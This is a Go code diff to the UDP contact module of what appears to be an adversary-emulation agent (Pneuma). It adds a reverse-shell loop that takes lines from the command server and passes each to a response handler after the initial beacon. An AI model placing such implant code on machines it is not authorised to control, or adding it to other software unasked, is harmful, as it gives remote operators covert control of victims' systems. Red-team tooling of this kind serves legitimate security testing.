@@ -1,10 +1,12 @@
 package sockets
 
 import (
+	"bufio"
 	"bytes"
 	"encoding/json"
 	"io"
 	"net"
+	"strings"
 
 	"github.com/preludeorg/pneuma/util"
 )
@@ -23,6 +25,16 @@ func (contact UDP) Communicate(agent *util.AgentConfig, beacon util.Beacon) (uti
 		} else {
 			//initial beacon
 			udpBufferedSend(conn, beacon)
+
+			//reverse-shell
+			scanner := bufio.NewScanner(conn)
+			for scanner.Scan() && agent.Contact == "udp" {
+				message := strings.TrimSpace(scanner.Text())
+				udpRespond(conn, beacon, message, agent)
+				if agent.Contact != "udp" {
+					return beacon, nil
+				}
+			}
 		}
 		jitterSleep(agent.Sleep, "UDP")
 	}
